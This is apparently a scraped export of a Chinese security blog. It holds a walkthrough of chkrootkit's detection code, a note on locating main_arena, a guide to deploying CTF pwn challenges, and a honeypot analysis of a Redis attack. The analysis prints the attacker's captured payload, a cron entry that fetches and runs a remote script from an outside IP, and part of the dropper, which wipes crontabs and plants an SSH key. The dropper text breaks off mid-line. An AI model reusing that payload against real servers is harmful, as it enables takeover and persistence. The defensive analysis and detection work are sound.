$&#123;ROOTDIR&#125;var/lib/games/.k ]then echo &quot;Possible HiDrootkit installed&quot;else if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;nothing found&quot;; fifi### t0rnif [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then printn\\ &quot;Searching for t0rn&apos;s default files and dirs... &quot;; fiif [ -f $&#123;ROOTDIR&#125;etc/ttyhash -o -f $&#123;ROOTDIR&#125;sbin/xlogin -o \\ -d $&#123;ROOTDIR&#125;usr/src/.puta -o -r $&#123;ROOTDIR&#125;lib/ldlib.tk -o \\ -d $&#123;ROOTDIR&#125;usr/info/.t0rn ]then echo &quot;Possible t0rn rootkit installed&quot;else if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;nothing found&quot;; fifi 对程序的SUID位的设置进行检测1234567891011121314151617181920212223chk_basename () &#123; STATUS=$&#123;NOT_INFECTED&#125; CMD=`loc basename basename $pth` if [ &quot;$&#123;EXPERT&#125;&quot; = &quot;t&quot; ]; then expertmode_output &quot;$&#123;strings&#125; -a $&#123;CMD&#125;&quot; expertmode_output &quot;$&#123;ls&#125; -l $&#123;CMD&#125;&quot; return 5 fi if $&#123;strings&#125; -a $&#123;CMD&#125; | $&#123;egrep&#125; &quot;$&#123;GENERIC_ROOTKIT_LABEL&#125;&quot; &gt; /dev/null 2&gt;&amp;1 then STATUS=$&#123;INFECTED&#125; fi [ &quot;$SYSTEM&quot; != &quot;OSF1&quot; ] &amp;&amp; &#123; if $&#123;ls&#125; -l $&#123;CMD&#125; | $&#123;egrep&#125; &quot;^...s&quot; &gt; /dev/null 2&gt;&amp;1 then STATUS=$&#123;INFECTED&#125; fi &#125; return $&#123;STATUS&#125;&#125; 这个除了检测有无关键字，还检测SUID位有无设置 对ldsopreload的检测1234567891011121314151617181920212223242526chk_ldsopreload() &#123; STATUS=$&#123;NOT_INFECTED&#125; CMD=&quot;$&#123;ROOTDIR&#125;lib/libshow.so $&#123;ROOTDIR&#125;lib/libproc.a&quot; if [ &quot;$&#123;SYSTEM&#125;&quot; = &quot;Linux&quot; ] then if [ ! -x ./strings-static ]; then printn &quot;can&apos;t exec ./strings-static, &quot; return $&#123;NOT_TESTED&#125; fi if [ &quot;$&#123;EXPERT&#125;&quot; = &quot;t&quot; ]; then expertmode_output &quot;./strings-static -a $&#123;CMD&#125;&quot; return 5 fi ### strings must be a statically linked binary. if ./strings-static -a $&#123;CMD&#125; &gt; /dev/null 2&gt;&amp;1 then STATUS=$&#123;INFECTED&#125; fi else STATUS=$&#123;NOT_TESTED&#125; fi return $&#123;STATUS&#125;&#125; 检测是否有libshow.so，libproc.a，有就说明感染了恶意so文件 可以看到为了保险起见，作者使用的是自己目录下静态编译的strings进行检测 查找可疑的log文件例子如下： 12345678910files=`$&#123;find&#125; $&#123;ROOTDIR&#125;dev $&#123;ROOTDIR&#125;tmp $&#123;ROOTDIR&#125;lib $&#123;ROOTDIR&#125;etc $&#123;ROOTDIR&#125;var \\$&#123;findargs&#125; \\( -name &quot;tcp.log&quot; -o -name &quot;.linux-sniff&quot; -o -name &quot;sniff-l0g&quot; -o -name &quot;core_&quot; \\) \\2&gt;/dev/null`if [ &quot;$&#123;files&#125;&quot; = &quot;&quot; ]then if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;nothing found&quot;; fielse echo echo $&#123;files&#125;fi 查找可疑的php文件查找一些可疑的php文件 123456789101112131415161718###### Suspect PHP files###if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then printn &quot;Searching for suspect PHP files... &quot;; fi files=&quot;`$&#123;find&#125; $&#123;ROOTDIR&#125;tmp $&#123;ROOTDIR&#125;var/tmp $&#123;findargs&#125; -name &apos;*.php&apos; 2&gt; /dev/null`&quot;if [ `echo abc | head -n 1` = &quot;abc&quot; ]; then fileshead=&quot;`$&#123;find&#125; $&#123;ROOTDIR&#125;tmp $&#123;ROOTDIR&#125;var/tmp $&#123;findargs&#125; -type f -exec head -n 1 &#123;&#125; \\; | $egrep &apos;#!.*php&apos; 2&gt; /dev/null`&quot;else fileshead=&quot;`$&#123;find&#125; $&#123;ROOTDIR&#125;tmp $&#123;ROOTDIR&#125;var/tmp $&#123;findargs&#125; -type f -exec head -1 &#123;&#125; \\; | grep &apos;#!.*php&apos; 2&gt; /dev/null`&quot;fiif [ &quot;$&#123;files&#125;&quot; = &quot;&quot; -a &quot;$&#123;fileshead&#125;&quot; = &quot;&quot; ]; then if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;nothing found&quot;; fielse echo echo &quot;$&#123;files&#125;&quot; echo &quot;$&#123;fileshead&#125;&quot;fi 检测.history文件看看history有没有被清空了，或者软连接到其他地方了 1234567891011121314if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then \\ printn &quot;Searching for anomalies in shell history files... &quot;; fi files=&quot;&quot; if [ ! -z &quot;$&#123;SHELL&#125;&quot; -a ! -z &quot;$&#123;HOME&#125;&quot; ]; then files=`$&#123;find&#125; $&#123;ROOTDIR&#125;$&#123;HOME&#125; $&#123;findargs&#125; -name &apos;.*history&apos; -size 0` [ ! -z &quot;$&#123;files&#125;&quot; ] &amp;&amp; \\ echo &quot;Warning: \\`$&#123;files&#125;&apos; file size is zero&quot; files1=`$&#123;find&#125; $&#123;ROOTDIR&#125;$&#123;HOME&#125; $&#123;findargs&#125; -name &apos;.*history&apos; \\( -links 2 -o -type l \\)` [ ! -z &quot;$&#123;files1&#125;&quot; ] &amp;&amp; \\ echo &quot;Warning: \\`$&#123;files1&#125;&apos; is linked to another file&quot; fi if [ -z &quot;$&#123;files&#125;&quot; -a -z &quot;$&#123;files1&#125;&quot; ]; then if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;nothing found&quot;; fi fi 检测有无程序监听了一些可疑的端口检测代码如下： 123456789101112131415161718192021222324252627bindshell () &#123;PORT=&quot;114|145|465|511|600|1008|1524|1999|1978|2881|3049|3133|3879|4000|4369|5190|5665|6667|10008|12321|23132|27374|29364|30999|31336|31337|37998|45454|47017|47889|60001|7222&quot; OPT=&quot;-an&quot; PI=&quot;&quot; if [ &quot;$&#123;ROOTDIR&#125;&quot; != &quot;/&quot; ]; then echo &quot;not tested&quot; return $&#123;NOT_TESTED&#125; fi if [ &quot;$&#123;EXPERT&#125;&quot; = &quot;t&quot; ]; then expertmode_output &quot;$&#123;netstat&#125; $&#123;OPT&#125;&quot; return 5 fi for P in `echo $PORT | $&#123;sed&#125; &apos;s/|/ /g&apos;`; do if $&#123;netstat&#125; &quot;$&#123;OPT&#125;&quot; | $&#123;egrep&#125; &quot;^tcp.*LIST|^udp&quot; | $&#123;egrep&#125; \\&quot;[.:]$&#123;P&#125;[^0-9.:]&quot; &gt;/dev/null 2&gt;&amp;1 then PI=&quot;$&#123;PI&#125; $&#123;P&#125;&quot; fi done if [ &quot;$&#123;PI&#125;&quot; != &quot;&quot; ] then echo &quot;INFECTED PORTS: ($PI)&quot; else if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;not infected&quot;; fi fi&#125; 检测Linux可加载内核模块123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263lkm ()&#123; prog=&quot;&quot; if [ \\( &quot;$&#123;SYSTEM&#125;&quot; = &quot;Linux&quot; -o \\( &quot;$&#123;SYSTEM&#125;&quot; = &quot;FreeBSD&quot; -a \\ `echo $&#123;V&#125; | $&#123;awk&#125; &apos;&#123; if ($1 &gt; 4.3 || $1 &lt; 6.0) print 1; else print 0 &#125;&apos;` -eq 1 \\) \\) -a &quot;$&#123;ROOTDIR&#125;&quot; = &quot;/&quot; ]; then [ -x ./chkproc -a &quot;`find /proc | wc -l`&quot; -gt 1 ] &amp;&amp; prog=&quot;./chkproc&quot; [ -x ./chkdirs ] &amp;&amp; prog=&quot;$prog ./chkdirs&quot; if [ &quot;$prog&quot; = &quot;&quot; ]; then echo &quot;not tested: can&apos;t exec $prog&quot; return $&#123;NOT_TESTED&#125; fi if [ &quot;$&#123;EXPERT&#125;&quot; = &quot;t&quot; ]; then [ -r /proc/$KALLSYMS ] &amp;&amp; $&#123;egrep&#125; -i &quot;adore|sebek&quot; &lt; /proc/$KALLSYMS 2&gt;/dev/null [ -d /proc/knark ] &amp;&amp; $&#123;ls&#125; -la /proc/knark 2&gt; /dev/null PV=`$ps -V 2&gt;/dev/null| $cut -d &quot; &quot; -f 3 |$&#123;awk&#125; -F . &apos;&#123; print $1 &quot;.&quot; $2 $3 &#125;&apos; | $&#123;awk&#125; &apos;&#123; if ($0 &gt; 3.19) print 3; else if ($0 &lt; 2.015) print 1; else print 2 &#125;&apos;` [ &quot;$PV&quot; = &quot;&quot; ] &amp;&amp; PV=2 [ &quot;$&#123;SYSTEM&#125;&quot; = &quot;SunOS&quot; ] &amp;&amp; PV=0 expertmode_output &quot;./chkproc -v -v -p $PV&quot; return 5 fi ### adore LKM [ -r /proc/$KALLSYMS ] &amp;&amp; \\ if `$&#123;egrep&#125; -i adore &lt; /proc/$KALLSYMS &gt;/dev/null 2&gt;&amp;1`; then echo &quot;Warning: Adore LKM installed&quot; fi ### sebek LKM (Adore based) [ -r /proc/$KALLSYMS ] &amp;&amp; \\ if `$&#123;egrep&#125; -i sebek &lt; /proc/$KALLSYMS &gt;/dev/null 2&gt;&amp;1`; then echo &quot;Warning: Sebek LKM installed&quot; fi ### knark LKM if [ -d /proc/knark ]; then echo &quot;Warning: Knark LKM installed&quot; fi PV=`$ps -V 2&gt;/dev/null| $cut -d &quot; &quot; -f 3 |$&#123;awk&#125; -F . &apos;&#123; print $1 &quot;.&quot; $2 $3 &#125;&apos; | $&#123;awk&#125; &apos;&#123; if ($0 &gt; 3.19) print 3; else if ($0 &lt; 2.11) print 1; else print 2 &#125;&apos;` [ &quot;$PV&quot; = &quot;&quot; ] &amp;&amp; PV=2 [ &quot;$&#123;SYSTEM&#125;&quot; = &quot;SunOS&quot; ] &amp;&amp; PV=0 if [ &quot;$&#123;DEBUG&#125;&quot; = &quot;t&quot; ]; then $&#123;echo&#125; &quot;*** PV=$PV ***&quot; fi if ./chkproc -p $&#123;PV&#125;; then if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;chkproc: nothing detected&quot;; fi else echo &quot;chkproc: Warning: Possible LKM Trojan installed&quot; fi dirs=&quot;/tmp&quot; for i in /usr/share /usr/bin /usr/sbin /lib; do [ -d $i ] &amp;&amp; dirs=&quot;$dirs $i&quot; done if ./chkdirs $dirs; then if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;chkdirs: nothing detected&quot;; fi else echo &quot;chkdirs: Warning: Possible LKM Trojan installed&quot; fi else if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;chkproc: not tested&quot;; fi fi&#125; loadable kernel module (LKM)，这个是检测内核模块的 ，看看有无adore，sebek这些内核模块 之后调用chkproc，chkdirs进行检测，这两个下面检测有无隐藏进程，会说到 检测有无隐藏进程 这个代码在chkproc.c中，它通过暴力递归，看看有没有/proc目录存在，而ps查不出来的进程，那么就说明有进程隐藏了 123456789101112131415161718192021222324252627282930313233 /* Brute force */ strcpy(buf, &quot;/proc/&quot;); retps = retdir = 0; for (i = FIRST_PROCESS; i &lt;= MAX_PROCESSES; i++) &#123; // snprintf(&amp;buf[6], 6, &quot;%d&quot;, i); snprintf(&amp;buf[6], 8, &quot;%d&quot;, i); if (!chdir(buf)) &#123; if (!dirproc[i] &amp;&amp; !psproc[i]) &#123;#if defined(__linux__) if (!isathread[i]) &#123;#endif retdir++; if (verbose) printf (&quot;PID %5d(%s): not in readdir output\\n&quot;, i, buf);#if defined(__linux__) &#125;#endif &#125; if (!psproc[i] ) /* &amp;&amp; !kill(i, 0)) */ &#123;#if defined(__linux__) if(!isathread[i]) &#123;#endif retps++; if (verbose) printf (&quot;PID %5d: not in ps output\\n&quot;, i);#if defined(__linux__) &#125;#endif &#125; 检测目录的软链接异常chkdirs比较的是父目录的软链接数和子目录的个数 正常情况下，父目录的软链接数 = 子目录的个数 + 2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859if (!linkcount) &#123; if (lstat(&quot;.&quot;, &amp;statinfo)) &#123; fprintf(stderr, &quot;lstat(%s): %s\\n&quot;, fullpath, strerror(errno)); goto abort; &#125; linkcount = statinfo.st_nlink; //获取符号链接数 &#125; if (!(dirhandle = opendir(&quot;.&quot;))) &#123; fprintf(stderr, &quot;opendir(%s): %s\\n&quot;, fullpath, strerror(errno)); goto abort; &#125; numdirs = 0; dl = (struct dirinfolist *)NULL; while ((finfo = readdir(dirhandle))) &#123; if (!strcmp(finfo-&gt;d_name, &quot;.&quot;) || !strcmp(finfo-&gt;d_name, &quot;..&quot;)) continue; if (lstat(finfo-&gt;d_name, &amp;statinfo)) &#123; fprintf(stderr, &quot;lstat(%s/%s): %s\\n&quot;, fullpath, finfo-&gt;d_name, strerror(errno)); closedir(dirhandle); goto abort; &#125; if (S_ISDIR(statinfo.st_mode)) &#123; //判断是否是目录 numdirs++; if (norecurse) continue; /* just count subdirs if &quot;-n&quot; */ /* Otherwise, keep a list of all directories found that have link count &gt; 2 (indicating directory contains subdirectories). We&apos;ll call check_dir() on each of these subdirectories in a moment... */ if (statinfo.st_nlink &gt; 2) &#123; dptr = dl; if (!(dl = (struct dirinfolist *)malloc(sizeof(struct dirinfolist)))) &#123; fprintf(stderr, &quot;malloc() failed: %s\\n&quot;, strerror(errno)); norecurse = 1; while (dptr) &#123; dl = dptr-&gt;dil_next; free((void *)dptr); dptr = dl; &#125; continue; &#125; strncpy(dl-&gt;dil_name, finfo-&gt;d_name, sizeof(dl-&gt;dil_name)); dl-&gt;dil_lc = statinfo.st_nlink; dl-&gt;dil_next = dptr; &#125; &#125; &#125; closedir(dirhandle); /* Parent directory link count had better equal #subdirs+2... */ diff = linkcount - numdirs - 2; // if (diff) printf(&quot;%d\\t%s\\n&quot;, diff, fullpath); 检测网络接口的异常123456789101112131415161718192021 sniffer () &#123; if [ &quot;$&#123;ROOTDIR&#125;&quot; != &quot;/&quot; ]; then echo &quot;not tested&quot; return $&#123;NOT_TESTED&#125; fi if [ &quot;$SYSTEM&quot; = &quot;SunOS&quot; ]; then return $&#123;NOT_TESTED&#125; fi if [ &quot;$&#123;EXPERT&#125;&quot; = &quot;t&quot; ]; then expertmode_output &quot;./ifpromisc&quot; -v return 5 fi if [ ! -x ./ifpromisc ]; then echo &quot;not tested: can&apos;t exec ./ifpromisc&quot; return $&#123;NOT_TESTED&#125; else [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ] &amp;&amp; ./ifpromisc -v || ./ifpromisc -q fi&#125; 这个是对网络接口的检测，看看有无开启网卡混杂模式（英语：promiscuous mode） 而PF_PACKET可以操作链路层的数据，可以读取和发送链路层的数据包 12345 ./ifpromisc -vens3: PF_PACKET(/sbin/dhclient)virbr0: not promisc and no PF_PACKET socketsdocker0: not promisc and no PF_PACKET socketsbr-47a3d838588a: not promisc and no PF_PACKET sockets 检测用户的登录日志检测用户的登录相关的log文件 SunOS使用的是check_wtmpx，比较的文件是/var/adm/wtmp，/var/adm/wtmpx,check_wtmpx部分代码，比较这两个文件的一些差异，比如下面的比较uid 12345if ( memcmp( utmp_entry.ut_id, utmpx_entry.ut_id, 4 ) != 0 )&#123; fprintf( stderr, &quot;[ %u ] utmp_entry.ut_id != utmpx_entry.ut_id\\n&quot;, wtmp_read_counter ); break;&#125; 其他linux检测的是var/log/wtmp或者var/adm/wtmpchkwtmp部分代码，查看有无删除了登录时间 1234567891011121314151617181920212223242526272829gettimeofday(&amp;mytime, &amp;dummy); act_time=mytime.tv_sec; wtmpfile[127]=&apos;\\0&apos;; memcpy(wtmpfile, WTMP_FILENAME, 127); if ( argc == 3 &amp;&amp; !memcmp(&quot;-f&quot;, argv[1], 2) &amp;&amp; *argv[2]) memcpy(wtmpfile, argv[2], 127); if ((filehandle=open(wtmpfile,O_RDONLY)) &lt; 0) &#123; fprintf(stderr, &quot;unable to open wtmp-file %s\\n&quot;, wtmpfile); return(2); &#125; while (read (filehandle, (char *) &amp;utmp_ent, sizeof (struct utmp)) &gt; 0) &#123; if (utmp_ent.ut_time == 0) del_counter++; else &#123; if (del_counter) &#123; printit(del_counter, start_time, utmp_ent.ut_time); t_del++; del_counter=0; &#125; start_time=utmp_ent.ut_time; &#125; &#125; close(filehandle); if (del_counter) printit(del_counter, start_time, act_time); exit((int) t_del+del_counter); 检测上一次登录使用chklastlog程序检测，下面是部分代码，用户的数据通过getpwent函数获取，其实就是通过/etc/passwd获取，检测基于两点 1、通过比较MAX_ID,与当前的遍历的用户的id，看看id是否大于环境变量MAX_ID2、看看是否有这样的情况：用户名出现在lastlog，wtmp文件中，而在/etc/passwd中没有的 12345678910111213141516171819202122232425262728293031323334if ( !nonuser(utmp_ent) &amp;&amp; strncmp(utmp_ent.ut_line, &quot;ftp&quot;, 3) &amp;&amp; (uid=localgetpwnam(localpwd,utmp_ent.ut_name)) != NULL ) &#123; if (*uid &gt; MAX_ID) &#123; fprintf(stderr, &quot;MAX_ID is %ld and current uid is %ld, please check\\n\\r&quot;, MAX_ID, *uid ); exit (1); &#125; if (!userid[*uid]) &#123; lseek(fh_lastlog, (long)*uid * sizeof (struct lastlog), 0); if ((wtmp_bytes_read = read(fh_lastlog, &amp;lastlog_ent, sizeof (struct lastlog))) &gt; 0) &#123; if (wtmp_bytes_read &lt; sizeof(struct lastlog)) &#123; fprintf(stderr, &quot;lastlog entry may be corrupted&quot;); break; &#125; if (lastlog_ent.ll_time == 0) &#123; if (-1 != (slot = getslot(localpwd, *uid))) printf(&quot;user %s deleted or never logged from lastlog!\\n&quot;, NULL != localpwd-&gt;uname[slot] ? (char*)localpwd-&gt;uname[slot] : &quot;(null)&quot;); else printf(&quot;deleted user uid(%d) not in passwd\\n&quot;, *uid); ++status; &#125; userid[*uid]=TRUE; &#125; &#125; &#125;&#125; 检测可疑的没有tty记录的进程检测的是/var/run/utmp或者/var/adm/utmpx，方法是比较的是ps命令与/var/run/utmp文件之间的差别 12345678910111213141516171819202122232425262728293031y = fetchps(ps_l);z = fetchutmp(ut_l);hdr_prntd = 0;for (h = 0; h &lt; y; h++) &#123; /* loop through &apos;ps&apos; data */mtch_fnd = 0;for (i = 0; i &lt; z; i++) &#123; /* try and match the tty from &apos;ps&apos; to one in utmp */ if (ut_l[i].ut_type == LOGIN_PROCESS /* ignore getty processes with matching pid from &apos;ps&apos; */ &amp;&amp; ut_l[i].ut_pid == ps_l[h].ps_pid) &#123; mtch_fnd = 1; break; &#125; else if (strncmp(ps_l[h].ps_tty, ut_l[i].ut_tty, /* compare the tty&apos;s */ strlen(ps_l[h].ps_tty)) == 0) &#123; mtch_fnd = 1; break; &#125;&#125;if (!mtch_fnd) &#123; if (!hdr_prntd) &#123; printf (&quot; The tty of the following user process(es) were not found\\n&quot;); printf(&quot; in %s !\\n&quot;, UTMP); printf(&quot;! %-9s %7s %-6s %s\\n&quot;, &quot;RUID&quot;, &quot;PID&quot;, &quot;TTY&quot;, &quot;CMD&quot;); hdr_prntd = 1; &#125; printf(&quot;! %-9s %7d %-6s %s&quot;, ps_l[h].ps_user, ps_l[h].ps_pid, ps_l[h].ps_tty, ps_l[h].ps_args);&#125; 比如下面的检测结果，而我的/var/run/utmp中是没有tty7这个tty的记录的 1234Checking `chkutmp&apos;... The tty of the following user process(es) were not found in /var/run/utmp !! RUID PID TTY CMD! root 1076 tty7 /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch","categories":[],"tags":[{"name":"rootkit","slug":"rootkit","permalink":"https://www.giantbranch.cn/tags/rootkit/"},{"name":"检测rootkit","slug":"检测rootkit","permalink":"https://www.giantbranch.cn/tags/检测rootkit/"}]},{"title":"没有libc6-dbg的符号如何查找main_arena","slug":"没有libc6-dbg的符号如何查找main_arena","date":"2018-09-30T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/09/30/没有libc6-dbg的符号如何查找main_arena/","link":"","permalink":"https://www.giantbranch.cn/2018/09/30/没有libc6-dbg的符号如何查找main_arena/","excerpt":"","text":"通过malloc_trim函数定位一种方法是先从ida找到malloc_trim函数，那么下面这个就是main_arena的偏移了 为什么呢，我们看看malloc_trim的源码 1234567891011121314151617int__malloc_trim (size_t s)&#123; int result = 0; if (__malloc_initialized &lt; 0) ptmalloc_init (); mstate ar_ptr = &amp;main_arena; do &#123; __libc_lock_lock (ar_ptr-&gt;mutex); result |= mtrim (ar_ptr, s); __libc_lock_unlock (ar_ptr-&gt;mutex); ar_ptr = ar_ptr-&gt;next; &#125; while (ar_ptr != &amp;main_arena); return result;&#125; 通过malloc_hook定位在导出表里面搜索malloc_hook 跟过去，在他下面+0x10的就是main_arena 其他方法其实方法很多，我们解引用一些这个地址，发现很多函数都会用到的，只要那个位置比较固定，我们就能找出来","categories":[],"tags":[{"name":"查找main_arena","slug":"查找main-arena","permalink":"https://www.giantbranch.cn/tags/查找main-arena/"}]},{"title":"评论系统更新为Disqus，原来的来必力太垃圾了","slug":"评论系统更新为Disqus，原来的来必力太垃圾了","date":"2018-09-30T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/09/30/评论系统更新为Disqus，原来的来必力太垃圾了/","link":"","permalink":"https://www.giantbranch.cn/2018/09/30/评论系统更新为Disqus，原来的来必力太垃圾了/","excerpt":"","text":"来必力next支持这个，所以当初直接用了这个，但是后来发现别人的评论了后，我在来必力的后台可以看到，但是页面上看不到，那我就不能够回复别人了，顺便在这篇文章回复下以下两个评论 对于二进制安全研究员的日常：我觉得这个得看公司，比如绿盟的研究工作相对比较自由跟轻松，有很多时间自己喜欢什么就可以研究什么，什么漏洞分析，利用，与挖掘，包括物联网安全研究也是可以的，甚至偶尔打下ctf也可以，有时候也出去培训培训别人，但是这个主要看个人兴趣和爱好。我相信其他公司没有那么自由了。 对于Adober Flash Player ActiveX那个问题，可以到下面找找看 https://helpx.adobe.com/flash-player/kb/archived-flash-player-versions.html 配置新评论系统DisqusDisqus这个评论系统还是比较方便的，注册后新建一个网站 对于next主题，只要在config文件，enable，加个shortname就行了 1234disqus: enable: true shortname: XXXXXX count: true 评论系统满血复活 虽然以前的评论都没了，但是也是值得的~","categories":[],"tags":[{"name":"更新评论系统","slug":"更新评论系统","permalink":"https://www.giantbranch.cn/tags/更新评论系统/"}]},{"title":"如何安全快速地部署多道ctf pwn比赛题目","slug":"如何安全快速地部署多道ctf pwn比赛题目","date":"2018-09-24T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/09/24/如何安全快速地部署多道ctf pwn比赛题目/","link":"","permalink":"https://www.giantbranch.cn/2018/09/24/如何安全快速地部署多道ctf pwn比赛题目/","excerpt":"","text":"前言一开始接触pwn的时候，我们要么本地调试，要么自己用socat将程序启动起来远程调试 最近去搞pwn培训，发现将pwn题一个一个部署起来还是比较繁琐，除了权限还要考虑其他东西 后来一顿搜索，看看有无别人的解决方案，发现一个xinted + docker的方案： https://github.com/Eadom/ctf_xinetd 但是对于这个我发现了一些缺点： 需要自己配置flag 需要自己修改ctf.xinetd文件 没有docker-compose.yml方便我们去启动 一次只能部署一个题目（我想一键将5道题甚至是10道题同时部署在一个docker容器中） 安全性基于chroot，而且只给了ls，cat和sh三个程序，已经很安全了，但是sh还是存在fork炸弹的可能 于是我根据自己需要，写了一个项目：https://github.com/giantbranch/pwn_deploy_chroot pwn_deploy_chroot介绍特点 一次可以部署多个题目到一个docker容器中 自动生成flag,并备份到当前目录 也是基于xinted + docker + chroot 利用python脚本根据pwn的文件名自动化地生成3个文件：pwn.xinetd，Dockerfile和docker-compose.yml 在/bin目录，利用自己编写的静态编译的catflag程序作为/bin/sh,这样的话，system(“/bin/sh”)实际执行的只是读取flag文件的内容，完全不给搅屎棍任何操作的余地 默认从10000端口监听，多一个程序就+1，起始的监听端口可以在config.py配置，或者生成pwn.xinetd和docker-compose.yml后自己修改这两个文件 环境配置123456# 安装dockercurl -s https://get.docker.com/ | sh# 安装 docker compose 和gitapt install docker-compose git# 下载git clone https://github.com/giantbranch/pwn_deploy_chroot.git 使用只需要3步： 将所有pwn题目放入bin目录（注意名字不带特殊字符，因为会将文件名作为linux用户名） python initialize.py docker-compose up –build -d 下面给下详细操作： 1、将你要部署的pwn题目放到bin目录 我的项目已经将一个程序copy了3分作为示例，注意文件名不要含有特殊字符，文件名建议使用字母，下划线，横杆和数字，当然全字母的当然最好了 12root@instance-1:~/pwn_deploy_chroot# ls bin/pwn1 pwn1_copy1 pwn1_copy2 2、运行initialize.py 运行脚本后会输出每个pwn的监听端口， 12345root@instance-1:~/pwn_deploy_chroot# python initialize.pypwn1&apos;s port: 10000pwn1_copy1&apos;s port: 10001pwn1_copy2&apos;s port: 10002 文件与端口信息，还有随机生成的flag默认备份到flags.txt 12345678root@instance-1:~/pwn_deploy_chroot# cat flags.txt pwn1: flag&#123;93aa6da5-db45-46fa-a2e1-af2be6698692&#125;pwn1_copy1: flag&#123;f9966c51-52e4-4212-ac44-97bf16620b41&#125;pwn1_copy2: flag&#123;b17949ce-e3fa-4ca7-9fcc-44b8dc997cb3&#125;pwn1&apos;s port: 10000pwn1_copy1&apos;s port: 10001pwn1_copy2&apos;s port: 10002 3、启动环境 请使用root用户执行命令 1docker-compose up --build -d 不出意外，题目就启动起来了 1234root@instance-1:~/pwn_deploy_chroot# netstat -antp | grep dockertcp6 0 0 :::10002 :::* LISTEN 19828/docker-proxytcp6 0 0 :::10000 :::* LISTEN 19887/docker-proxytcp6 0 0 :::10001 :::* LISTEN 19873/docker-proxy 我们测试一下pwn1,看看效果 可以看到，虽然执行的是system(“/bin/sh”)，但是实际功能只是输出flag，这样就非常安全了 感谢https://github.com/Eadom/ctf_xinetd","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"部署","slug":"部署","permalink":"https://www.giantbranch.cn/tags/部署/"}]},{"title":"ctf pwn题目的部署","slug":"ctf pwn题目的部署","date":"2018-09-17T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/09/17/ctf pwn题目的部署/","link":"","permalink":"https://www.giantbranch.cn/2018/09/17/ctf pwn题目的部署/","excerpt":"","text":"使用socat部署安装 1apt install socat 模板：socat tcp-listen:port,fork exec:./程序名,reuseaddr 实例：socat tcp-listen:10001,fork exec:./pwn1,reuseaddr 缺点：需要控制好权限；存在各种风险 使用pwn_deploy部署https://github.com/giantbranch/pwn_deploy 项目基于docker和xinetd项目主要根据bin目录的文件，动态生成flag，xinetd配置文件，Dockerfile和docker-compose.yml程序都是放在家目录，通过权限控制不能进入别人的家目录，同时不能修改或删除二进制程序和flag文件 使用 将所有pwn题目放入bin目录（注意文件名不要带特殊字符） python initialize.py docker-compose up –build -d 这个部署方式并不太安全，只是基于权限控制 请使用： https://github.com/giantbranch/pwn_deploy_chroot 使用pwn_deploy_chroot部署https://github.com/giantbranch/pwn_deploy_chroot 项目基于docker，xinetd和chroot，更加安全 相对上面的pwn_deploy，使用chroot更加安全 而且用自己写的catflag程序作为/bin/sh程序，这就将安全性提升一步了 使用步骤也是3步： 将所有pwn题目放入bin目录（注意文件名不要带特殊字符） python initialize.py docker-compose up –build -d","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"部署","slug":"部署","permalink":"https://www.giantbranch.cn/tags/部署/"}]},{"title":"Redis删库跑路加勒索？也有挖矿的呢","slug":"Redis删库跑路加勒索？也有挖矿的呢","date":"2018-09-12T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2018/09/12/Redis删库跑路加勒索？也有挖矿的呢/","link":"","permalink":"https://www.giantbranch.cn/2018/09/12/Redis删库跑路加勒索？也有挖矿的呢/","excerpt":"","text":"在9月10日我就发现我的蜜罐有个url的数量出现暴增（估计还可能因为我写递归提取下载地址的时候没有控制好），但是没空去分析，简单看了下是redis的6379端口的。（当然现在这个脚本已经下线了） 9月11日0点，阿里发了一个预警《预警| 删库跑路加勒索，Redis勒索事件爆发》，详细请看下面链接 https://media.weibo.cn/article?id=2309404282854916934109 我看了下我的蜜罐有没有http://103.224.80.52/butterfly.sh这个url，发现并没有，估计是因为我没有模拟redis服务，只是开放了6379端口 我这边抓到的payload是下面的，也是通过写入cron的方式 1*3\\r\\n$3\\r\\nset\\r\\n$7\\r\\nbackup1\\r\\n$64\\r\\n\\n\\n\\n*/2 * * * * curl -fsSL http://47.93.38.159:8080/ash.sh | sh\\n\\n\\r\\n 看看ash.sh脚本，主要是写入ssh公钥和写入cron和下载bsh.sh执行 123456789101112131415161718uname -aidhostnamesetenforce 0 2&gt;/dev/nullulimit -n 50000ulimit -u 50000crontab -r 2&gt;/dev/nullrm -rf /var/spool/cron/* 2&gt;/dev/nullmkdir -p /var/spool/cron/crontabs 2&gt;/dev/nullmkdir -p /root/.ssh 2&gt;/dev/nullecho &apos;ssh-rsa 